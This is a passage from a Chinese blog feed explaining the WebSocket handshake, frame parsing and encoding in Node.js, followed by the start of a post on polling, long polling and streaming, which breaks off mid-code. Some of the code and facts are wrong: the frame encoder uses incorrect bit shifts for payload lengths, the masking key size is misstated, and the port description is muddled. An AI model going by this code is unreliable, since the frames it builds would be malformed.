function_">on</span>(<span class="string">&#x27;data&#x27;</span>,<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!key)&#123;</span><br><span class="line">            <span class="comment">//握手</span></span><br><span class="line">            key = e.<span class="title function_">toString</span>().<span class="title function_">match</span>(<span class="regexp">/Sec-WebSocket-Key: (.+)/</span>)[<span class="number">1</span>];</span><br><span class="line">            key = crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;sha1&#x27;</span>).<span class="title function_">update</span>(key + <span class="variable constant_">WS</span>).<span class="title function_">digest</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">            o.<span class="title function_">write</span>(<span class="string">&#x27;HTTP/1.1 101 Switching Protocols\r\n&#x27;</span>);</span><br><span class="line">            o.<span class="title function_">write</span>(<span class="string">&#x27;Upgrade: websocket\r\n&#x27;</span>);</span><br><span class="line">            o.<span class="title function_">write</span>(<span class="string">&#x27;Connection: Upgrade\r\n&#x27;</span>);</span><br><span class="line">            o.<span class="title function_">write</span>(<span class="string">&#x27;Sec-WebSocket-Accept: &#x27;</span> + key + <span class="string">&#x27;\r\n&#x27;</span>);</span><br><span class="line">            o.<span class="title function_">write</span>(<span class="string">&#x27;\r\n&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">8000</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>关于crypto模块，可以看看<a href="http://nodejs.org/api/crypto.html" target="_blank">官方文档</a>，上面的代码应该是很好理解的，服务器应答之后，Client 拿到 Sec-WebSocket-Accept ，然后本地做一次验证，如果验证通过了，就会触发 onopen 函数。</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="comment">//客户端程序</span></span><br><span class="line"><span class="keyword">var</span> ws=<span class="keyword">new</span> WebSocket(<span class="string">&quot;ws://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">ws.onopen=<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;握手成功&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到</p><p><img src="https://images.cnitblog.com/blog/387325/201312/20133127-7a4e0e60138c4f59b8c132ef1706c6e3.jpg" alt=""></p><h4>3. 数据帧格式</h4><p>官方文档提供了一个结构图</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-------+-+-------------+-------------------------------+</span><br><span class="line">|<span class="string">F</span>|<span class="string">R</span>|<span class="string">R</span>|<span class="string">R</span>|<span class="string"> opcode</span>|<span class="string">M</span>|<span class="string"> Payload len </span>|<span class="string">    Extended payload length    </span>|</span><br><span class="line">|<span class="string">I</span>|<span class="string">S</span>|<span class="string">S</span>|<span class="string">S</span>|<span class="string">  (4)  </span>|<span class="string">A</span>|<span class="string">     (7)     </span>|<span class="string">             (16/64)           </span>|</span><br><span class="line">|<span class="string">N</span>|<span class="string">V</span>|<span class="string">V</span>|<span class="string">V</span>|<span class="string">       </span>|<span class="string">S</span>|<span class="string">             </span>|<span class="string">   (if payload len==126/127)   </span>|</span><br><span class="line">|<span class="string"> </span>|<span class="string">1</span>|<span class="string">2</span>|<span class="string">3</span>|<span class="string">       </span>|<span class="string">K</span>|<span class="string">             </span>|<span class="string">                               </span>|</span><br><span class="line">+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +</span><br><span class="line">|<span class="string">     Extended payload length continued, if payload len == 127  </span>|</span><br><span class="line">+ - - - - - - - - - - - - - - - +-------------------------------+</span><br><span class="line">|<span class="string">                               </span>|<span class="string">Masking-key, if MASK set to 1  </span>|</span><br><span class="line">+-------------------------------+-------------------------------+</span><br><span class="line">|<span class="string"> Masking-key (continued)       </span>|<span class="string">          Payload Data         </span>|</span><br><span class="line">+-------------------------------- - - - - - - - - - - - - - - - +</span><br><span class="line">:                     Payload Data continued ...                :</span><br><span class="line">+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +</span><br><span class="line">|<span class="string">                     Payload Data continued ...                </span>|</span><br><span class="line">+---------------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一眼瞟到这张图恐怕是要吐血，如果大学修改计算机网络这门课应该不会对这东西陌生，数据传输协议嘛，是需要定义字节长度及相关含义的。</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">FIN</span>      <span class="number">1</span>bit 表示信息的最后一帧，flag，也就是标记符</span><br><span class="line"><span class="attribute">RSV</span> <span class="number">1</span>-<span class="number">3</span>  <span class="number">1</span>bit each 以后备用的 默认都为 <span class="number">0</span></span><br><span class="line"><span class="attribute">Opcode</span>   <span class="number">4</span>bit 帧类型，稍后细说</span><br><span class="line"><span class="attribute">Mask</span>     <span class="number">1</span>bit 掩码，是否加密数据，默认必须置为<span class="number">1</span> （这里很蛋疼）</span><br><span class="line"><span class="attribute">Payload</span>  <span class="number">7</span>bit 数据的长度</span><br><span class="line"><span class="attribute">Masking</span>-key      <span class="number">1</span> or <span class="number">4</span> bit 掩码</span><br><span class="line"><span class="attribute">Payload</span> data     (x + y) bytes 数据</span><br><span class="line"><span class="attribute">Extension</span> data   x bytes  扩展数据</span><br><span class="line"><span class="attribute">Application</span> data y bytes  程序数据</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>每一帧的传输都是遵从这个协议规则的，知道了这个协议，那么解析就不会太难了，下面我就直接拿了<a href="http://www.web-tinker.com/" target="_blank">次碳酸钴</a>同学的代码。</p><h4>4. 数据帧的解析和编码</h4><p>数据帧的解析代码：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> decodeDataFrame(e)&#123;</span><br><span class="line">  var i=<span class="number">0</span>,j,s,frame=&#123;</span><br><span class="line">    <span class="regexp">//</span>解析前两个字节的基本数据</span><br><span class="line">    FIN:e[i]&gt;&gt;<span class="number">7</span>,Opcode:e[i++]&amp;<span class="number">15</span>,Mask:e[i]&gt;&gt;<span class="number">7</span>,</span><br><span class="line">    PayloadLength:e[i++]&amp;<span class="number">0</span>x7F</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="regexp">//</span>处理特殊长度<span class="number">126</span>和<span class="number">127</span></span><br><span class="line">  <span class="keyword">if</span>(frame.PayloadLength==<span class="number">126</span>)</span><br><span class="line">    frame.length=(e[i++]&lt;&lt;<span class="number">8</span>)+e[i++];</span><br><span class="line">  <span class="keyword">if</span>(frame.PayloadLength==<span class="number">127</span>)</span><br><span class="line">    i+=<span class="number">4</span>, <span class="regexp">//</span>长度一般用四字节的整型，前四个字节通常为长整形留空的</span><br><span class="line">    frame.length=(e[i++]&lt;&lt;<span class="number">24</span>)+(e[i++]&lt;&lt;<span class="number">16</span>)+(e[i++]&lt;&lt;<span class="number">8</span>)+e[i++];</span><br><span class="line">  <span class="regexp">//</span>判断是否使用掩码</span><br><span class="line">  <span class="keyword">if</span>(frame.Mask)&#123;</span><br><span class="line">    <span class="regexp">//</span>获取掩码实体</span><br><span class="line">    frame.MaskingKey=[e[i++],e[i++],e[i++],e[i++]];</span><br><span class="line">    <span class="regexp">//</span>对数据和掩码做异或运算</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>,s=[];j&lt;frame.PayloadLength;j++)</span><br><span class="line">      s.push(e[i+j]^frame.MaskingKey[j%<span class="number">4</span>]);</span><br><span class="line">  &#125;<span class="keyword">else</span> s=e.slice(i,frame.PayloadLength); <span class="regexp">//</span>否则直接使用数据</span><br><span class="line">  <span class="regexp">//</span>数组转换成缓冲区来使用</span><br><span class="line">  s=new Buffer(s);</span><br><span class="line">  <span class="regexp">//</span>如果有必要则把缓冲区转换成字符串来使用</span><br><span class="line">  <span class="keyword">if</span>(frame.Opcode==<span class="number">1</span>)s=s.toString();</span><br><span class="line">  <span class="regexp">//</span>设置上数据部分</span><br><span class="line">  frame.PayloadData=s;</span><br><span class="line">  <span class="regexp">//</span>返回数据帧</span><br><span class="line">  return frame;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数据帧的编码：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="comment">//NodeJS</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encodeDataFrame</span>(<span class="params">e</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> s=[],o=<span class="keyword">new</span> <span class="built_in">Buffer</span>(e.PayloadData),l=o.<span class="built_in">length</span>;</span><br><span class="line">  <span class="comment">//输入第一个字节</span></span><br><span class="line">  s.<span class="built_in">push</span>((e.FIN&lt;&lt;<span class="number">7</span>)+e.Opcode);</span><br><span class="line">  <span class="comment">//输入第二个字节，判断它的长度并放入相应的后续长度消息</span></span><br><span class="line">  <span class="comment">//永远不使用掩码</span></span><br><span class="line">  <span class="keyword">if</span>(l&lt;<span class="number">126</span>)s.<span class="built_in">push</span>(l);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(l&lt;<span class="number">0x10000</span>)s.<span class="built_in">push</span>(<span class="number">126</span>,(l&amp;<span class="number">0xFF00</span>)&gt;&gt;<span class="number">2</span>,l&amp;<span class="number">0xFF</span>);</span><br><span class="line">  <span class="keyword">else</span> s.<span class="built_in">push</span>(</span><br><span class="line">    <span class="number">127</span>, <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>, <span class="comment">//8字节数据，前4字节一般没用留空</span></span><br><span class="line">    (l&amp;<span class="number">0xFF000000</span>)&gt;&gt;<span class="number">6</span>,(l&amp;<span class="number">0xFF0000</span>)&gt;&gt;<span class="number">4</span>,(l&amp;<span class="number">0xFF00</span>)&gt;&gt;<span class="number">2</span>,l&amp;<span class="number">0xFF</span></span><br><span class="line">  );</span><br><span class="line">  <span class="comment">//返回头部分和数据部分的合并缓冲区</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Buffer</span>.concat([<span class="keyword">new</span> <span class="built_in">Buffer</span>(s),o]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有些童鞋可能没有明白，应该解析哪些数据。这的解析任务主要是服务端处理，客户端送过去的数据是二进制流形式的，比如：&nbsp;</p><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&quot;ws://127.0.0.1:8000/&quot;</span>); ws.onopen = <span class="keyword">function</span><span class="params">()</span>&#123; 　　ws.send(<span class="string">&quot;握手成功&quot;</span>); &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Server 收到的信息是这样的：</p><p><img src="https://images.cnitblog.com/blog/387325/201312/20133241-2339e90ef5c94d318d1d36645fb545ce.jpg" alt=""></p><p>一个放在Buffer格式的二进制流。而当我们输出的时候解析这个二进制流：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//服务器程序</span></span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">WS</span> = <span class="string">&#x27;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&#x27;</span>;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;net&#x27;</span>).<span class="title function_">createServer</span>(<span class="keyword">function</span>(<span class="params">o</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> key;</span><br><span class="line">    o.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>,<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!key)&#123;</span><br><span class="line">            <span class="comment">//握手</span></span><br><span class="line">            key = e.<span class="title function_">toString</span>().<span class="title function_">match</span>(<span class="regexp">/Sec-WebSocket-Key: (.+)/</span>)[<span class="number">1</span>];</span><br><span class="line">            key = crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;sha1&#x27;</span>).<span class="title function_">update</span>(key + <span class="variable constant_">WS</span>).<span class="title function_">digest</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">            o.<span class="title function_">write</span>(<span class="string">&#x27;HTTP/1.1 101 Switching Protocols\r\n&#x27;</span>);</span><br><span class="line">            o.<span class="title function_">write</span>(<span class="string">&#x27;Upgrade: websocket\r\n&#x27;</span>);</span><br><span class="line">            o.<span class="title function_">write</span>(<span class="string">&#x27;Connection: Upgrade\r\n&#x27;</span>);</span><br><span class="line">            o.<span class="title function_">write</span>(<span class="string">&#x27;Sec-WebSocket-Accept: &#x27;</span> + key + <span class="string">&#x27;\r\n&#x27;</span>);</span><br><span class="line">            o.<span class="title function_">write</span>(<span class="string">&#x27;\r\n&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 输出之前解析帧</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">decodeDataFrame</span>(e));</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">8000</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那输出的就是一个帧信息十分清晰的对象了：</p><p><img src="https://images.cnitblog.com/blog/387325/201312/20133301-7e939b556bef46b8856b81c87b169c57.jpg" alt=""></p><h4>5. 连接的控制</h4><p>上面我买了个关子，提到的Opcode，没有详细说明，<a href="http://tools.ietf.org/html/rfc6455" target="_blank">官方文档</a>也给了一张表：</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line"> |<span class="string">Opcode  </span>|<span class="string"> Meaning                             </span>|<span class="string"> Reference </span>|</span><br><span class="line">-+--------+-------------------------------------+-----------|<span class="string"></span></span><br><span class="line"><span class="string"> </span>|<span class="string"> 0      </span>|<span class="string"> Continuation Frame                  </span>|<span class="string"> RFC 6455  </span>|</span><br><span class="line">-+--------+-------------------------------------+-----------|<span class="string"></span></span><br><span class="line"><span class="string"> </span>|<span class="string"> 1      </span>|<span class="string"> Text Frame                          </span>|<span class="string"> RFC 6455  </span>|</span><br><span class="line">-+--------+-------------------------------------+-----------|<span class="string"></span></span><br><span class="line"><span class="string"> </span>|<span class="string"> 2      </span>|<span class="string"> Binary Frame                        </span>|<span class="string"> RFC 6455  </span>|</span><br><span class="line">-+--------+-------------------------------------+-----------|<span class="string"></span></span><br><span class="line"><span class="string"> </span>|<span class="string"> 8      </span>|<span class="string"> Connection Close Frame              </span>|<span class="string"> RFC 6455  </span>|</span><br><span class="line">-+--------+-------------------------------------+-----------|<span class="string"></span></span><br><span class="line"><span class="string"> </span>|<span class="string"> 9      </span>|<span class="string"> Ping Frame                          </span>|<span class="string"> RFC 6455  </span>|</span><br><span class="line">-+--------+-------------------------------------+-----------|<span class="string"></span></span><br><span class="line"><span class="string"> </span>|<span class="string"> 10     </span>|<span class="string"> Pong Frame                          </span>|<span class="string"> RFC 6455  </span>|</span><br><span class="line">-+--------+-------------------------------------+-----------|<span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>decodeDataFrame 解析数据，得到的数据格式是：</p><figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="attribute">&#123;</span></span><br><span class="line"><span class="attribute">    FIN</span><span class="punctuation">:</span> <span class="string">1,</span></span><br><span class="line">    <span class="attribute">Opcode</span><span class="punctuation">:</span> <span class="string">1,</span></span><br><span class="line">    <span class="attribute">Mask</span><span class="punctuation">:</span> <span class="string">1,</span></span><br><span class="line">    <span class="attribute">PayloadLength</span><span class="punctuation">:</span> <span class="string">4,</span></span><br><span class="line">    <span class="attribute">MaskingKey</span><span class="punctuation">:</span> <span class="string">[ 159, 18, 207, 93 ],</span></span><br><span class="line">    <span class="attribute">PayLoadData</span><span class="punctuation">:</span> <span class="string">&#x27;握手成功&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么可以对应上面查看，此帧的作用就是发送文本，为文本帧。因为连接是基于 TCP 的，直接关闭 TCP 连接，这个通道就关闭了，不过 WebSocket 设计的还比较人性化，关闭之前还跟你打一声招呼，在服务器端，可以判断frame的Opcode：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">var frame<span class="operator">=</span>decodeDataFrame(e)<span class="comment">;</span></span><br><span class="line">console.log(frame)<span class="comment">;</span></span><br><span class="line">if(frame.Opcode<span class="operator">=</span><span class="operator">=</span><span class="number">8</span>)&#123;</span><br><span class="line">    o.end()<span class="comment">; //断开连接</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端和服务端交互的数据（帧）格式都是一样的，只要客户端发送 <code>ws.close()</code>， 服务器就会执行上面的操作。相反，如果服务器给客户端也发送同样的关闭帧(close frame)：</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">o</span><span class="selector-class">.write</span>(<span class="built_in">encodeDataFrame</span>(&#123;</span><br><span class="line">    <span class="attribute">FIN</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="attribute">Opcode</span>:<span class="number">8</span>,</span><br><span class="line">    <span class="attribute">PayloadData</span>:buf</span><br><span class="line">&#125;));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端就会相应 onclose 函数，这样的交互还算是有规有矩，不容易出错。</p><h3>二、注意事项</h3><h4>1. WebSocket URIs</h4><p>很多人可能只知道&nbsp;<code>ws://text.com:8888</code>，但事实上 websocket 协议地址是可以加 path 和 query 的。</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ws-URI</span> <span class="operator">=</span> <span class="string">&quot;ws:&quot;</span> <span class="string">&quot;//&quot;</span> host [ <span class="string">&quot;:&quot;</span> port ] path [ <span class="string">&quot;?&quot;</span> query ]</span><br><span class="line"><span class="attribute">wss-URI</span> <span class="operator">=</span> <span class="string">&quot;wss:&quot;</span> <span class="string">&quot;//&quot;</span> host [ <span class="string">&quot;:&quot;</span> port ] path [ <span class="string">&quot;?&quot;</span> query ]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果使用的是 wss 协议，那么 URI 将会以安全方式连接。 这里的 wss 大小写不敏感。</p><h4>2. 协议中"多余"的部分（吐槽）</h4><p>握手请求中包含Sec-WebSocket-Key字段，明眼人一下就能看出来是websocket连接，而且这个字段的加密方式在服务器也是固定的，如果别人想黑你，不会太难。</p><p>再就是那个 MaskingKey 掩码，既然强制加密了（Mask为1表示加密，加密方式就是 MaskingKey 与 PayLoadData 进行异或处理），还有必要让开发者处理这个东西么？直接封装到内部不就行了？</p><h4 id="menuIndex9">3. 与 TCP 和 HTTP 之间的关系</h4><p>WebSocket协议是一个基于TCP的协议，就是握手链接的时候跟HTTP相关（发了一个HTTP请求），这个请求被Server切换到（Upgrade）websocket协议了。websocket把 80 端口作为默认websocket连接端口，而websocket的运行使用的是443端口。</p><h3>三、参考资料</h3><ul><li><a href="http://tools.ietf.org/html/rfc6455" target="_blank">http://tools.ietf.org/html/rfc6455</a> web standard - The WebSocket Protocol</li><li><a href="http://www.w3.org/TR/websockets/" target="_blank">http://www.w3.org/TR/websockets/</a> W3.ORG - WebSockets</li></ul><h3>四、特别感谢</h3><p>再次感谢 <a href="http://www.web-tinker.com/" target="_blank">次碳酸钴</a> 跟我交流了几个小时 : )，本文部分 node 代码参考自他的博客。</p><p>下次将以php作为后台，讲解websocket的相关知识。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> websocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript之web通信</title>
      <link href="/blog/2013/12/17/cb-web-communication/"/>
      <url>/blog/2013/12/17/cb-web-communication/</url>
      
        <content type="html"><![CDATA[<p>web通信，一个特别大的topic，涉及面也是很广的。因最近学习了 javascript 中一些 web 通信知识，在这里总结下。文中应该会有理解错误或者表述不清晰的地方，还望斧正！</p><h3>一、前言</h3><h4>1. comet技术</h4><blockquote><p>浏览器作为 Web 应用的前台，自身的处理功能比较有限。浏览器的发展需要客户端升级软件，同时由于客户端浏览器软件的多样性，在某种意义上，也影响了浏览器新技术的推广。在 Web 应用中，浏览器的主要工作是发送请求、解析服务器返回的信息以不同的风格显示。AJAX 是浏览器技术发展的成果，通过在浏览器端发送异步请求，提高了单用户操作的响应性。但 Web 本质上是一个多用户的系统，对任何用户来说，可以认为服务器是另外一个用户。现有 AJAX 技术的发展并不能解决在一个多用户的 Web 应用中，将更新的信息实时传送给客户端，从而用户可能在\过时"的信息下进行操作。而 AJAX 的应用又使后台数据更新更加频繁成为可能。</p></blockquote><p>随着互联网的发展，web 应用层出不穷，也不乏各种网站监控、即时报价、即时通讯系统，为了让用户得到更好的体验，服务器需要频繁的向客户端推送信息。开发者一般会采用基于 AJAX 的长轮询方式或者基于 iframe 及 htmlfile 的流方式处理。当然有些程序需要在客户端安装各种插件( Java applet 或者 Flash )来支持性能比较良好的\推"信息。</p><h4>2. HTTP协议中的长、短连接</h4><blockquote><p><strong>短连接的操作步骤是：</strong>建立连接&mdash;&mdash;数据传输&mdash;&mdash;关闭连接...建立连接&mdash;&mdash;数据传输&mdash;&mdash;关闭连接<strong>长连接的操作步骤是：</strong>建立连接&mdash;&mdash;数据传输...（保持连接）...数据传输&mdash;&mdash;关闭连接</p></blockquote><p>长连接与短连接的不同主要在于client和server采取的关闭策略不同。短连接在建立连接以后只进行一次数据传输就关闭连接，而长连接在建立连接以后会进行多次数据数据传输直至关闭连接（长连接中关闭连接通过Connection：closed头部字段）。</p><h3>二、web 通信</h3><p>首先要搞清楚，xhr 的 readystate 各种状态。</p><table><thead><tr><th>属性                </th><th> 描述</th></tr></thead><tbody><tr><td>onreadystatechange  </td><td> 存储函数（或函数名），每当 readyState 属性改变时，就会调用该函数。</td></tr><tr><td>readyState          </td><td> 存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。  0: 请求未初始化  1: 服务器连接已建立  2: 请求已接收3: 请求处理中  4: 请求已完成，且响应已就绪</td></tr><tr><td>status              </td><td> 200: "OK" 404: 未找到页面</td></tr></tbody></table><h4>&nbsp;</h4><h4>1.轮询</h4><p>轮询是一种\拉"取信息的工作模式。设置一个定时器，定时询问服务器是否有信息，每次建立连接传输数据之后，链接会关闭。</p><p>前端实现：</p><figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="built_in">var</span> polling = function(url, <span class="keyword">type</span>, <span class="built_in">data</span>)&#123;</span><br><span class="line">    <span class="built_in">var</span> xhr = <span class="literal">new</span> XMLHttpRequest(),</span><br><span class="line">        <span class="keyword">type</span> = <span class="keyword">type</span> || <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">        <span class="built_in">data</span> = <span class="built_in">data</span> || <span class="built_in">null</span>;</span><br><span class="line"></span><br><span class="line">    xhr.onreadystatechange = function()&#123;</span><br><span class="line">        <span class="keyword">if</span>(xhr.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">            receive(xhr.responseText);</span><br><span class="line">            xhr.onreadystatechange = <span class="built_in">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    xhr.open(<span class="keyword">type</span>, url, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//IE的ActiveXObject(&quot;Microsoft.XMLHTTP&quot;)支持GET方法发送数据，</span></span><br><span class="line">    <span class="comment">//其它浏览器不支持，已测试验证</span></span><br><span class="line">    xhr.send(<span class="keyword">type</span> == <span class="string">&quot;GET&quot;</span> ? <span class="built_in">null</span> : <span class="built_in">data</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">var</span> timer = setInterval(function()&#123;</span><br><span class="line">    polling();</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在轮询的过程中，如果因为网络原因，导致上一个 xhr 对象还没传输完毕，定时器已经开始了下一个询问，上一次的传输是否还会在队列中，这个问题我没去研究。如果感兴趣可以自己写一个ajax的请求管理队列。</p><h4>2.长轮询(long-polling)</h4><p>长轮询其实也没啥特殊的地方，就是在xhr对象关闭连接的时候马上又给他接上~ 看码：</p><figure class="highlight qml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> longPoll = <span class="function"><span class="keyword">function</span>(<span class="params">type, url</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 状态为 4，数据传输完毕，重新连接</span></span><br><span class="line">        <span class="keyword">if</span>(xhr.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">            receive(xhr.responseText);</span><br><span class="line">            xhr.onreadystatechange = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            longPoll(type, <span class="built_in">url</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    xhr.open(type, <span class="built_in">url</span>, <span class="literal">true</span>);</span><br><span class="line">    xhr.send();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>只要服务器断开连接，客户端马上连接，不让他有一刻的休息时间，这就是长轮询。</p><h4>3.数据流</h4><p>数据流方式，在建立的连接断开之前，也就是 readystate 状态为 3 的时候接受数据，但是麻烦的事情也在这里，因为数据正在传输，你拿到的 xhr.response 可能就是半截数据，所以呢，最好定义一个数据传输的协议，比如前2个字节表示字符串的长度，然后你只获取这个长度的内容，接着改变游标的位置。</p><p>假如数据格式为： data splitChar &nbsp; data为数据内容，splitChar为数据结束标志（长度为1）。 那么传输的数据内容为 data splitChar data splitChar data splitChar...</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> dataStream = <span class="keyword">function</span>(<span class="params">type, url</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">    xhr.onreadystatechange = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 状态为 3，数据接收中</span></span><br><span class="line">        <span class="keyword">if</span>(xhr.readyState == <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> i, l, s;</span><br><span class="line"></span><br><span class="line">            s = xhr.response; <span class="comment">//读取数据</span></span><br><span class="line">            l = s.<span class="built_in">length</span>;     <span class="comment">//获取数据长度</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//从游标位置开始获取数据，并用分割数据</span></span><br><span class="line">            s = s.<span class="built_in">slice</span>(p, l - <span class="number">1</span>).<span class="built_in">split</span>(splitChar);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//循环并操作数据</span></span><br><span class="line">            <span class="keyword">for</span>(i in s) <span class="keyword">if</span>(s[i])  deal(s[i]);</span><br><span class="line"></span><br><span class="line">            p = l;  <span class="comment">//更新游标位置</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 状态为 4，数据传输完毕，重新连接</span></span><br><span class="line">        <span class="keyword">if</span>(xhr.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">            xhr.onreadystatechange = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            dataStream(type, url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    xhr.open(type, url, <span class="literal">true</span>);</span><br><span class="line">    xhr.send();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个代码写的是存在问题的，当readystate为3的时候可以获取数据，但是这时获取的数据可能只是整体数据的一部分，那后半截就拿不到了。readystate在数据传输完毕之前是不会改变的，也就是说他并不会继续接受剩下的数据。我们可以定时去监听readystate，这个下面的例子中可以看到。</p><p>这样的处理不算复杂，但是存在问题。上面的轮询和长轮询是所有浏览器都支持的，所以我就没有写兼容IE的代码，但是这里，低版本IE不允许在readystate为3的时候读取数据，所以我们必须采用其他的方式来实现。</p><p>在ajax还没有进入web专题之前，我们已经拥有了一个法宝，那就是iframe，利用iframe照样可以异步获取数据，对于低版本IE可以使用iframe来接受数据流。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(isIE)&#123;</span><br><span class="line">    <span class="keyword">var</span> dataStream = <span class="keyword">function</span>(<span class="params">url</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> ifr = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>), doc, timer;</span><br><span class="line"></span><br><span class="line">        ifr.<span class="property">src</span> = url;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(ifr);</span><br><span class="line"></span><br><span class="line">        doc = ifr.<span class="property">contentWindow</span>.<span class="property">document</span>;</span><br><span class="line"></span><br><span class="line">        timer = <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span 